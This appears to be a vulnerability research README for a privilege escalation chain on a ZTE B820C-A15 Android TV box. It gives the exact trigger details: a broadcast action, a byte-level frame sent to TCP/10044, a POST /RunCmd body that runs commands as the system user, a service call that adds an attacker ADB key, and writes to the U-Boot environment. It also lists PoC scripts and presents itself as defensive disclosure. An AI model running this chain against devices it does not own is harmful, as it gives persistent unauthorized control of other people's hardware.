# ZTE B820C-A15 — Privilege Escalation Chain (Amlogic S905X2 / Android 12)

Research notes and PoCs for a retail Android TV STB distributed by **izzi** (Mexico), manufactured by
**ZTE**, running on an **Amlogic S905X2** (G12A) SoC. Device shipped **AVB-locked, SELinux enforcing,
ADB disabled**, and with no user-accessible root.

Three independent design flaws in OEM components yield a full privilege chain to `system_app`
(uid 1000), `shell` (uid 2000) and unrestricted control of the U-Boot environment:

| # | Primitive | Vector | Result |
|---|-----------|--------|--------|
| 1 | OEM factory service exposed on loopback | exported broadcast `com.zte.stb.StartHWTest` + 46-byte frame to TCP/10044 | HTTP server on `127.0.0.1:10001` → **command execution as uid 1000** (`system_app`) |
| 2 | `IAdbManager.allowDebugging` reachable via `service call` | `service call adb 1 i32 1 s16 <pubkey>` | attacker key added to adbd's allowlist → **ADB over TCP, shell uid 2000**, persists across reboots |
| 3 | Amlogic `system_control` HIDL HAL exposes boot environment write | `setBootEnv()` reachable from uid 1000 | **U-Boot environment read/write as root** → boot path control (USB boot, `init=`, `root=`) |

No memory corruption is involved. All issues are missing access control / unsafe defaults. The chain is
fully reproducible from an unprivileged app (e.g. Termux) installed on the device.

## Affected build

```
Model            ZTE B820C-A15 (board "franklin"), sold by izzi (MX)
SoC              Amlogic S905X2 / G12A, reference board U212 (amlogic-dt-id=g12a_u212_mtk)
Android          12 (SDK 31)
Build            SC.eng.ztestb.20250103.234813 / V83511301.2070
Kernel           4.9.269 (32-bit userspace, armv8l)
Bootloader       U-Boot 2015.01-g65bcffe-dirty
Verified boot    AVB green, ro.boot.vbmeta.device_state=locked, avb2=1
SELinux          enforcing
Wi-Fi/BT         MediaTek MT7663 (SDIO)
```

## Chain

```
unprivileged app (uid 10xxx)
  │
  ├─ am broadcast -a com.zte.stb.StartHWTest            [docs/02]
  │     └─ starts FactoryTest activity + MyService (:10044) without permission checks
  ├─ magic frame  7e 01 2c ff | 43×00 | 7e  → tcp:10044
  │     └─ FactoryTest.am() → new HTTPServer(this).start()  (:10001)
  ├─ POST /RunCmd  {"dictData":{"shellCmd":"...","requestRst":"true"}}
  │     └─ command execution as uid=1000(system)  → primitive #1
  │
  ├─ service call adb 1 i32 1 s16 "<adbkey.pub>"        [docs/03]
  │     └─ adbd allowlist += key; adb connect 127.0.0.1:5555 → uid=2000(shell) → primitive #2
  │
  └─ ISystemControl::setBootEnv("ubootenv.var.*", value)  [docs/05]
        └─ root-owned HAL writes the U-Boot env partition → primitive #3

primitive #3  →  boot the device into attacker-controlled Linux from USB      [docs/06, 07]
primitive #3  →  hardware console access via UART_AO (same U-Boot)            [docs/07]
primitive #1  →  fix OEM-blocked APK installs, toggle appops, write /cache    [docs/04]
```

## PoCs

| File | Target |
|------|--------|
| [`poc/00_magic_frame.py`](poc/00_magic_frame.py) | Starts the factory HTTP server (TCP/10044 frame) |
| [`poc/01_run_cmd.py`](poc/01_run_cmd.py) | Command execution as uid 1000 (`/RunCmd`) |
| [`poc/02_adb_authorize.sh`](poc/02_adb_authorize.sh) | Authorizes an ADB key via `service call`; enables `adbd` over TCP |
| [`poc/03_enable_install.sh`](poc/03_enable_install.sh) | Re-enables sideloading (`REQUEST_INSTALL_PACKAGES`) |
| [`poc/04_hal_envset/`](poc/04_hal_envset/) | Java client for the root HAL; reads/writes U-Boot env |
| [`poc/05_usb_boot_hook.sh`](poc/05_usb_boot_hook.sh) | Installs the USB boot hook (with kill-switch + counters) |
| [`poc/06_disable_usb_boot.sh`](poc/06_disable_usb_boot.sh) | Reverts the U-Boot environment to factory values |
| [`poc/07_uart_console.md`](poc/07_uart_console.md) | UART_AO console (115200 8N1) — full U-Boot prompt |
| [`tools/recovery_backup.sh`](tools/recovery_backup.sh) | Read-only image of every boot-critical partition, from a recovery shell |
| [`tools/recovery_backup_pc.sh`](tools/recovery_backup_pc.sh) | Same, driven from a PC over adb (recovery adbd is root, no dialog) |
| [`tools/recovery_ladder.txt`](tools/recovery_ladder.txt) | Paste-ready console commands with per-step fallbacks (SELinux-confined recovery) |

## Narrative

1. [Reconnaissance](docs/01-recon.md)
2. [Factory HTTP service → uid 1000](docs/02-factory-runcmd.md)
3. [ADB enablement without a host](docs/03-adb-enable.md)
4. [Sideloading permissions](docs/04-install-permissions.md)
5. [Amlogic `system_control` HAL (root) → boot env](docs/05-hal-systemcontrol.md)
6. [U-Boot environment and USB boot](docs/06-uboot-env-and-usb-boot.md)
7. [UART console](docs/07-uart-console.md)
8. [Recovery and hardening notes](docs/08-recovery-and-hardening.md)
9. [Recovery mode: root shell for imaging](docs/09-recovery-mode.md)
10. [Prior art and comparable CVEs](docs/10-prior-art.md)

## References

- ophub/amlogic-s9xxx-armbian — Armbian for Amlogic TV boxes (kernel, DTBs, `u-boot.ext`)
  <https://github.com/ophub/amlogic-s9xxx-armbian>
- Amlogic U200/U212 mainline DTS: `arch/arm64/boot/dts/amlogic/meson-g12a-u200.dts` (U212 uses U200 DTB)
- AOSP 12 `AdbService` / `AdbDebuggingManager` (behavior of `allowDebugging`)
  <https://android.googlesource.com/platform/packages/modules/adb>
- ZTE PSIRT policy <https://policy.zte.com.cn/cybersecurity/highlights/psirt.html>

## Legal

Research performed on hardware owned by the author. No third-party devices or subscriber data were
accessed. Published for defensive purposes and to support vendor remediation.
